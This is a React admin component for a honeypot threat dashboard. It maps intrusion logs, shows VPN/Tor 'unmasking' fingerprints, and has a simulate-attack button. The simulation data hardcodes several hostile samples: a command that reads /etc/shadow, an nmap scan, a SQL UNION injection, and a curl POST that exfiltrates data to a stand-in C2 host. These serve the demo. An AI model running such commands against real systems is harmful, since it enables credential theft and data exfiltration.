import React, { useState, useEffect } from 'react';
import { HoneypotIntrusionLog, ThreatRiskLevel } from '../../types';
import { HoneypotTelemetryService } from '../../services/honeypotTelemetryService';
import {
  ShieldAlert,
  Globe,
  Radio,
  MapPin,
  Flame,
  Cpu,
  MailCheck,
  Download,
  Trash2,
  Play,
  ExternalLink,
  Eye,
  AlertTriangle,
  Terminal,
  Activity,
  Layers,
  Filter,
  CheckCircle2,
  X
} from 'lucide-react';

export const AdminThreatMap: React.FC = () => {
  const [threatLogs, setThreatLogs] = useState<HoneypotIntrusionLog[]>([]);
  const [selectedThreat, setSelectedThreat] = useState<HoneypotIntrusionLog | null>(null);
  const [riskFilter, setRiskFilter] = useState<string>('ALL');
  const [isSimulating, setIsSimulating] = useState(false);
  const [simulationToast, setSimulationToast] = useState<string | null>(null);

  useEffect(() => {
    loadThreats();
  }, []);

  const loadThreats = () => {
    const logs = HoneypotTelemetryService.getIntrusionLogs();
    setThreatLogs(logs);
    if (logs.length > 0 && !selectedThreat) {
      setSelectedThreat(logs[0]);
    }
  };

  const handleSimulateAttack = async () => {
    setIsSimulating(true);
    setSimulationToast('Triggering Live Honeypot Canary Trap & De-anonymizing Attacker...');

    const simulatedVectors: Array<{ type: HoneypotIntrusionLog['trapType']; path: string; payload: string }> = [
      { type: 'Fake Root Terminal', path: '#/system-root-login', payload: 'cat /etc/shadow; nmap -sV target' },
      { type: 'SQL Injection Sandbox', path: '#/wp-admin', payload: "' UNION SELECT 1, table_name FROM information_schema.tables --" },
      { type: 'Vulnerable DB Backup', path: '#/db-backup.sql', payload: 'curl -X POST http://malicious-c2.net/exfil' },
      { type: 'API Debug Leak', path: '#/api/v1/debug', payload: 'GET /api/v1/admin/keys?bypass=true' }
    ];

    const randomVector = simulatedVectors[Math.floor(Math.random() * simulatedVectors.length)];

    try {
      const newLog = await HoneypotTelemetryService.captureIntrusion(
        randomVector.type,
        randomVector.path,
        { injectedCommands: randomVector.payload },
        'CRITICAL'
      );

      loadThreats();
      setSelectedThreat(newLog);
      setSimulationToast(`🚨 Attack Intercepted! Forensic email notification dispatched to golamrabbi4801@gmail.com`);
      setTimeout(() => setSimulationToast(null), 5000);
    } catch (e) {
      console.error(e);
    } finally {
      setIsSimulating(false);
    }
  };

  const handleClearLogs = () => {
    if (confirm('Are you sure you want to clear threat intrusion logs?')) {
      HoneypotTelemetryService.clearLogs();
      loadThreats();
      setSelectedThreat(null);
    }
  };

  const handleExportJson = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(threatLogs, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `threat_incident_report_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  const filteredThreats = threatLogs.filter((t) => {
    if (riskFilter === 'ALL') return true;
    return t.riskLevel === riskFilter;
  });

  const criticalCount = threatLogs.filter((t) => t.riskLevel === 'CRITICAL').length;
  const vpnUnmaskedCount = threatLogs.filter((t) => t.vpnTorDetection.isVpnOrProxy).length;

  return (
    <div className="space-y-6 animate-fadeIn font-sans">
      
      {/* Top Header & Quick Actions */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 bg-neutral-950/80 p-5 rounded-2xl border border-neutral-800">
        <div>
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-rose-500/20 border border-rose-500/40 flex items-center justify-center text-rose-400 animate-pulse">
              <Radio className="w-4 h-4" />
            </div>
            <h2 className="font-serif text-xl sm:text-2xl font-bold text-white tracking-wide">
              Live Threat Map & De-Anonymization Radar
            </h2>
          </div>
          <p className="text-xs text-neutral-400 mt-1">
            Real-time honeypot traps, VPN/Tor unmasking heuristics, and instant forensic email alerts.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2.5">
          <button
            onClick={handleSimulateAttack}
            disabled={isSimulating}
            className="px-3.5 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-xs font-bold uppercase tracking-wider flex items-center gap-2 transition-all shadow-lg hover:shadow-rose-600/30 active:scale-98 disabled:opacity-50"
          >
            <Play className="w-3.5 h-3.5 fill-current" />
            <span>{isSimulating ? 'Simulating...' : 'Test Honeypot Trap'}</span>
          </button>

          <button
            onClick={handleExportJson}
            className="px-3.5 py-2 bg-neutral-850 hover:bg-neutral-800 text-neutral-200 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-colors border border-neutral-750"
          >
            <Download className="w-3.5 h-3.5 text-amber-400" />
            <span>Export Forensic JSON</span>
          </button>

          <button
            onClick={handleClearLogs}
            className="p-2 text-neutral-400 hover:text-rose-400 hover:bg-neutral-800 rounded-xl transition-colors"
            title="Clear Logs"
          >
            <Trash2 className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Simulation Toast Notification */}
      {simulationToast && (
        <div className="bg-rose-950/80 border border-rose-600 text-rose-200 p-4 rounded-xl text-xs flex items-center justify-between gap-3 animate-fadeIn">
          <div className="flex items-center gap-2.5">
            <MailCheck className="w-5 h-5 text-emerald-400 shrink-0" />
            <span>{simulationToast}</span>
          </div>
          <button onClick={() => setSimulationToast(null)} className="text-neutral-400 hover:text-white">
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* 4 Statistical Metric Blocks */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        
        <div className="bg-neutral-950/80 border border-neutral-800 rounded-2xl p-4">
          <span className="text-[10px] uppercase font-mono tracking-wider text-neutral-400 block mb-1">
            Total Trapped Intrusions
          </span>
          <div className="flex items-baseline gap-2">
            <span className="text-2xl font-mono font-bold text-white">{threatLogs.length}</span>
            <span className="text-[10px] text-emerald-400 font-mono">100% Intercepted</span>
          </div>
        </div>

        <div className="bg-neutral-950/80 border border-neutral-800 rounded-2xl p-4">
          <span className="text-[10px] uppercase font-mono tracking-wider text-rose-400 block mb-1">
            Critical Injections Blocked
          </span>
          <div className="flex items-baseline gap-2">
            <span className="text-2xl font-mono font-bold text-rose-400">{criticalCount}</span>
            <span className="text-[10px] text-neutral-500 font-mono">SQLi / Root Terminal</span>
          </div>
        </div>

        <div className="bg-neutral-950/80 border border-neutral-800 rounded-2xl p-4">
          <span className="text-[10px] uppercase font-mono tracking-wider text-amber-400 block mb-1">
            VPN / Tor Unmasked
          </span>
          <div className="flex items-baseline gap-2">
            <span className="text-2xl font-mono font-bold text-amber-400">{vpnUnmaskedCount}</span>
            <span className="text-[10px] text-neutral-500 font-mono">De-anonymized</span>
          </div>
        </div>

        <div className="bg-neutral-950/80 border border-neutral-800 rounded-2xl p-4">
          <span className="text-[10px] uppercase font-mono tracking-wider text-emerald-400 block mb-1">
            Alert Dispatch Status
          </span>
          <div className="flex items-center gap-1.5 mt-1">
            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
            <span className="text-xs font-mono font-bold text-emerald-300 truncate">
              golamrabbi4801@...
            </span>
          </div>
        </div>

      </div>

      {/* Cyber Threat Radar Visualization & Interactive Attack Map */}
      <div className="bg-neutral-950/90 border border-neutral-800 rounded-2xl p-5 shadow-2xl space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-neutral-800/80 pb-3">
          <div>
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Globe className="w-4 h-4 text-cyan-400" />
              Global & Regional Attack Origin Radar
            </h3>
            <p className="text-xs text-neutral-400">
              Live geographic nodes displaying attacker latitude/longitude coordinates and intrusion vectors.
            </p>
          </div>

          <div className="flex items-center gap-3 text-xs font-mono">
            <span className="flex items-center gap-1.5 text-rose-400">
              <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping" />
              Critical Threat
            </span>
            <span className="flex items-center gap-1.5 text-amber-400">
              <span className="w-2.5 h-2.5 rounded-full bg-amber-400" />
              High Risk
            </span>
            <span className="flex items-center gap-1.5 text-cyan-400">
              <span className="w-2.5 h-2.5 rounded-full bg-cyan-400" />
              Medium Risk
            </span>
          </div>
        </div>

        {/* SVG World / Asia Cyber Radar Map */}
        <div className="relative w-full h-[320px] bg-neutral-900/60 rounded-xl border border-neutral-800 overflow-hidden flex items-center justify-center p-4">
          
          {/* Grid lines background */}
          <div className="absolute inset-0 bg-[linear-gradient(to_right,#1f293715_1px,transparent_1px),linear-gradient(to_bottom,#1f293715_1px,transparent_1px)] bg-[size:24px_24px]" />
          
          {/* SVG Map Projection */}
          <svg className="w-full h-full text-neutral-750" viewBox="0 0 1000 450" fill="none" stroke="currentColor" strokeWidth="1">
            {/* Equator & Meridians */}
            <line x1="50" y1="225" x2="950" y2="225" stroke="#374151" strokeDasharray="4 4" />
            <line x1="500" y1="30" x2="500" y2="420" stroke="#374151" strokeDasharray="4 4" />
            
            {/* World Landmass Silhouettes (Simplified Vector Coastlines) */}
            {/* North America */}
            <path d="M120,90 Q220,70 300,110 Q320,180 260,240 Q180,260 130,170 Z" fill="#171e2e" stroke="#2a3854" />
            {/* South America */}
            <path d="M260,260 Q340,290 320,380 Q270,420 240,320 Z" fill="#171e2e" stroke="#2a3854" />
            {/* Europe */}
            <path d="M460,80 Q540,70 550,130 Q490,160 450,120 Z" fill="#171e2e" stroke="#2a3854" />
            {/* Africa */}
            <path d="M470,170 Q560,180 550,290 Q480,330 460,230 Z" fill="#171e2e" stroke="#2a3854" />
            {/* Asia & Bangladesh Subcontinent */}
            <path d="M570,70 Q780,60 850,160 Q790,260 620,200 Z" fill="#1c2438" stroke="#3b4d75" strokeWidth="1.5" />
            {/* Australia */}
            <path d="M760,290 Q850,290 840,360 Q760,380 740,330 Z" fill="#171e2e" stroke="#2a3854" />
          </svg>

          {/* Interactive Dynamic Threat Pings positioned by Lat/Lon calculation */}
          {threatLogs.map((threat) => {
            // Project Lat/Lon to SVG 1000x450 coordinate space
            // Lon -180..180 -> x 50..950
            const x = Math.max(80, Math.min(920, ((threat.longitude + 180) / 360) * 850 + 75));
            // Lat 90..-90 -> y 40..410
            const y = Math.max(50, Math.min(400, ((90 - threat.latitude) / 180) * 350 + 50));

            const isSelected = selectedThreat?.id === threat.id;

            return (
              <div
                key={threat.id}
                style={{ left: `${(x / 1000) * 100}%`, top: `${(y / 450) * 100}%` }}
                onClick={() => setSelectedThreat(threat)}
                className="absolute -translate-x-1/2 -translate-y-1/2 cursor-pointer group z-20"
              >
                {/* Radar Ring */}
                <div
                  className={`w-7 h-7 rounded-full -translate-x-1/2 -translate-y-1/2 absolute top-1/2 left-1/2 animate-ping ${
                    threat.riskLevel === 'CRITICAL'
                      ? 'bg-rose-500/40'
                      : threat.riskLevel === 'HIGH'
                      ? 'bg-amber-400/40'
                      : 'bg-cyan-400/40'
                  }`}
                />

                {/* Core Pin */}
                <div
                  className={`w-3.5 h-3.5 rounded-full border-2 transition-transform transform group-hover:scale-150 ${
                    isSelected ? 'ring-4 ring-white/50 scale-125' : ''
                  } ${
                    threat.riskLevel === 'CRITICAL'
                      ? 'bg-rose-500 border-white'
                      : threat.riskLevel === 'HIGH'
                      ? 'bg-amber-400 border-neutral-950'
                      : 'bg-cyan-400 border-neutral-950'
                  }`}
                />

                {/* Tooltip Tag */}
                <div className="absolute left-1/2 bottom-full mb-1.5 -translate-x-1/2 hidden group-hover:flex flex-col items-center bg-neutral-950/95 border border-neutral-700 px-2.5 py-1 rounded-lg text-[10px] font-mono text-white whitespace-nowrap shadow-xl z-30 pointer-events-none">
                  <span className="font-bold text-amber-300">{threat.city}, {threat.countryCode}</span>
                  <span className="text-neutral-400">{threat.ip} • {threat.trapType}</span>
                </div>
              </div>
            );
          })}

          {/* Bangladesh Centric Focal Ring Indicator */}
          <div className="absolute top-[41%] left-[72%] -translate-x-1/2 -translate-y-1/2 pointer-events-none text-center">
            <span className="text-[9px] uppercase font-mono tracking-widest text-emerald-400/90 font-bold block">
              🇧🇩 BD Node
            </span>
          </div>
        </div>
      </div>

      {/* Main Split View: Threat Stream Table & Forensic Inspector */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left: Filterable Threat Stream (7 cols) */}
        <div className="lg:col-span-7 bg-neutral-950/90 border border-neutral-800 rounded-2xl p-5 shadow-xl space-y-4">
          
          <div className="flex flex-wrap items-center justify-between gap-3 border-b border-neutral-800 pb-3">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Activity className="w-4 h-4 text-rose-400" />
              Live Intrusion Intercept Stream ({filteredThreats.length})
            </h3>

            {/* Risk Filters */}
            <div className="flex gap-1 text-[11px] font-mono">
              {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map((lvl) => (
                <button
                  key={lvl}
                  onClick={() => setRiskFilter(lvl)}
                  className={`px-2.5 py-1 rounded-lg transition-colors ${
                    riskFilter === lvl
                      ? 'bg-neutral-800 text-white font-bold border border-neutral-700'
                      : 'text-neutral-500 hover:text-neutral-300'
                  }`}
                >
                  {lvl}
                </button>
              ))}
            </div>
          </div>

          <div className="space-y-2.5 max-h-[460px] overflow-y-auto pr-1">
            {filteredThreats.map((threat) => {
              const isSelected = selectedThreat?.id === threat.id;

              return (
                <div
                  key={threat.id}
                  onClick={() => setSelectedThreat(threat)}
                  className={`p-3.5 rounded-xl border transition-all cursor-pointer ${
                    isSelected
                      ? 'bg-neutral-900 border-amber-400 shadow-md ring-1 ring-amber-400/30'
                      : 'bg-neutral-950/70 border-neutral-800/80 hover:bg-neutral-900/50 hover:border-neutral-700'
                  }`}
                >
                  <div className="flex items-center justify-between gap-2 mb-1.5">
                    <div className="flex items-center gap-2">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold font-mono ${
                        threat.riskLevel === 'CRITICAL'
                          ? 'bg-rose-950 text-rose-300 border border-rose-800'
                          : threat.riskLevel === 'HIGH'
                          ? 'bg-amber-950 text-amber-300 border border-amber-800'
                          : 'bg-cyan-950 text-cyan-300 border border-cyan-800'
                      }`}>
                        {threat.riskLevel}
                      </span>
                      <span className="text-xs font-bold text-white font-mono">{threat.ip}</span>
                      <span className="text-xs text-neutral-400">• {threat.city}, {threat.country}</span>
                    </div>

                    <span className="text-[10px] text-neutral-500 font-mono">
                      {new Date(threat.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                    </span>
                  </div>

                  <div className="flex flex-wrap items-center justify-between gap-2 text-xs text-neutral-400">
                    <span className="text-neutral-300 font-mono text-[11px] truncate max-w-[280px]">
                      Trap: <span className="text-amber-300 font-bold">{threat.trapType}</span> ({threat.path})
                    </span>

                    {threat.vpnTorDetection.isVpnOrProxy ? (
                      <span className="text-[10px] text-rose-400 font-mono font-bold bg-rose-950/40 px-2 py-0.5 rounded border border-rose-900/50">
                        {threat.vpnTorDetection.isTor ? 'Tor Exit Node Unmasked' : 'VPN Proxy Bypassed'}
                      </span>
                    ) : (
                      <span className="text-[10px] text-emerald-400 font-mono bg-emerald-950/40 px-2 py-0.5 rounded border border-emerald-900/50">
                        Residential ISP
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>

        </div>

        {/* Right: Deep Forensic Incident Inspector (5 cols) */}
        <div className="lg:col-span-5 bg-neutral-950/90 border border-neutral-800 rounded-2xl p-5 shadow-xl space-y-4">
          
          <div className="flex items-center justify-between border-b border-neutral-800 pb-3">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Cpu className="w-4 h-4 text-amber-400" />
              Forensic Deep-Dive Inspector
            </h3>
            {selectedThreat && (
              <span className="text-[10px] font-mono text-neutral-400">ID: {selectedThreat.id}</span>
            )}
          </div>

          {selectedThreat ? (
            <div className="space-y-4 text-xs font-mono">
              
              {/* 1. Attacker Origin & Maps */}
              <div className="p-3.5 bg-neutral-900/80 border border-neutral-800 rounded-xl space-y-2">
                <div className="flex justify-between items-center text-neutral-400">
                  <span className="text-neutral-500 font-sans">Physical Coordinates:</span>
                  <span className="text-amber-400 font-bold">{selectedThreat.latitude}, {selectedThreat.longitude}</span>
                </div>
                <div className="flex justify-between items-center text-neutral-400">
                  <span className="text-neutral-500 font-sans">Location:</span>
                  <span className="text-white">{selectedThreat.city}, {selectedThreat.region}, {selectedThreat.country}</span>
                </div>
                <div className="flex justify-between items-center text-neutral-400">
                  <span className="text-neutral-500 font-sans">ISP / Carrier:</span>
                  <span className="text-neutral-300 truncate max-w-[180px]">{selectedThreat.isp}</span>
                </div>

                <a
                  href={`https://www.google.com/maps?q=${selectedThreat.latitude},${selectedThreat.longitude}`}
                  target="_blank"
                  rel="noreferrer"
                  className="w-full py-2 bg-neutral-800 hover:bg-neutral-750 text-cyan-300 rounded-lg text-xs font-sans flex items-center justify-center gap-1.5 transition-colors border border-neutral-700 mt-2"
                >
                  <MapPin className="w-3.5 h-3.5 text-rose-400" />
                  <span>Open Exact Location on Google Maps</span>
                  <ExternalLink className="w-3 h-3" />
                </a>
              </div>

              {/* 2. Anti-Evasion / VPN De-anonymization Evidence */}
              <div className="p-3.5 bg-neutral-900/80 border border-neutral-800 rounded-xl space-y-2">
                <span className="text-[10px] text-neutral-400 uppercase font-bold tracking-wider block font-sans">
                  🛡️ Anti-Evasion & De-Anonymization
                </span>
                <div className="flex justify-between">
                  <span className="text-neutral-500 font-sans">Tor Detection:</span>
                  <span className={selectedThreat.vpnTorDetection.isTor ? 'text-rose-400 font-bold' : 'text-neutral-400'}>
                    {selectedThreat.vpnTorDetection.isTor ? 'YES' : 'NO'}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-neutral-500 font-sans">Confidence:</span>
                  <span className="text-amber-400 font-bold">{selectedThreat.vpnTorDetection.confidenceScore}%</span>
                </div>
                <div className="space-y-1 pt-1 border-t border-neutral-800">
                  <span className="text-[10px] text-neutral-500 font-sans block">Unmasking Evidence:</span>
                  {selectedThreat.vpnTorDetection.reasons.map((r, i) => (
                    <p key={i} className="text-[11px] text-rose-300 leading-tight">• {r}</p>
                  ))}
                </div>
              </div>

              {/* 3. Physical Hardware & Leaks */}
              <div className="p-3.5 bg-neutral-900/80 border border-neutral-800 rounded-xl space-y-2">
                <span className="text-[10px] text-neutral-400 uppercase font-bold tracking-wider block font-sans">
                  💻 Physical Rig Fingerprint
                </span>
                <div>
                  <span className="text-neutral-500 font-sans block text-[10px]">GPU Renderer:</span>
                  <span className="text-cyan-300 text-[11px] break-words">{selectedThreat.device.webglRenderer}</span>
                </div>
                <div>
                  <span className="text-neutral-500 font-sans block text-[10px]">WebRTC Subnet IPs:</span>
                  <span className="text-rose-300 text-[11px]">{selectedThreat.device.webrtcCandidateIps?.join(', ') || 'None leaked'}</span>
                </div>
              </div>

              {/* 4. Captured Injected Payload */}
              <div className="p-3.5 bg-neutral-900/80 border border-neutral-800 rounded-xl space-y-1.5">
                <span className="text-[10px] text-neutral-400 uppercase font-bold tracking-wider block font-sans">
                  📝 Captured Attacker Keystrokes / Injected Commands
                </span>
                <pre className="p-2.5 bg-neutral-950 rounded-lg text-amber-300 text-[11px] overflow-x-auto border border-neutral-850">
                  {JSON.stringify(selectedThreat.payload, null, 2)}
                </pre>
              </div>

            </div>
          ) : (
            <div className="text-center py-16 text-neutral-500 text-xs">
              Select an intrusion incident from the stream to inspect forensic details.
            </div>
          )}

        </div>

      </div>

    </div>
  );
};
